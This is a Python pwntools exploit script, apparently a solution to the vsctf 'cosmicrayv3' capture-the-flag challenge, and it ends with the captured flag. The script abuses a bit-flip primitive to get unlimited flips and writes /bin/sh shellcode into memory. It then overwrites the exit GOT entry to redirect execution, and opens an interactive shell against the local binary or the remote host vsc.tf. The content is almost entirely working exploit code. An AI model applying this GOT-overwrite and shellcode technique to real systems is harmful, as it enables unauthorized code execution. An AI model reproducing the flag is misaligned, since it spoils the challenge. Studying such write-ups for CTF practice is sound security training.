#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./cosmicrayv3')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./cosmicrayv3', gdbscript=gs)
    if args.REMOTE:
        return remote('vsc.tf', 7000)
    else:
        return process('./cosmicrayv3')


r = start()

def zero_byte(address):
    is_first = True
    out = 0
    while True:
        r.sendlineafter(b"through:", hex(address))
        r.recvuntil(b"-----------------\n")

        bits = r.recvline(keepends=False).split(b"|")[1:-1]
        log.info(f" bits = {bits}")
        v = int(b"".join(bits),2)

        try:
            b = bits.index(b"1")
        except:
            b = 0
        r.sendlineafter(b"flip", str(b).encode('ascii'))

        if is_first:
            out = v
            is_first = False

        if bits.count(b"1") == 1:
            return out

def write_byte_to_addr(address, byte_value):

    for bit_position in range(8):
        bit_state = (byte_value >> bit_position) & 1
        if bit_state != 0:
            r.sendlineafter(b"cosmic ray through:",hex(address).encode('ascii'))
            r.sendlineafter(b"flip:", str(7-bit_position).encode('ascii'))
            log.info(f"Bit {bit_position}: changed")
        else:
            log.info(f"Bit {bit_position}: left in zero")

#========= exploit here ===================
#infinite bit flips by mod there address in cosmic_ray()
target = 0x4015aa
r.sendlineafter(b"cosmic ray through:", hex(target).encode('ascii'))
fliped_bit = 0x02
r.sendlineafter(b"position to flip:", str(fliped_bit).encode('ascii'))

pause()

shellcode = b"\x90"*0x10
shellcode += asm(shellcraft.amd64.linux.sh())
shellcode_address = 0x401800

for i in range(len(shellcode)):
    log.info(f"writing position {i} at address {shellcode_address} value {shellcode[i]} ")
    write_byte_to_addr(shellcode_address+i, shellcode[i])

for i in range(8):
    zero_byte(0x403fe8+i)

#writing the address of exit.got with the address of shellcode 0x401800
write_byte_to_addr(0x403fe8+1,0x18)
write_byte_to_addr(0x403fe8+2,0x40)

target = 0x0
r.sendlineafter(b"cosmic ray through:", hex(target).encode('ascii'))
#trigger exit?
fliped_bit = 0xa
r.sendlineafter(b"position to flip:", str(fliped_bit).encode('ascii'))


#========= interactive ====================
r.interactive()
#vsctf{4nd_th3_st4r5_4l1gn_0nc3_m0r3}
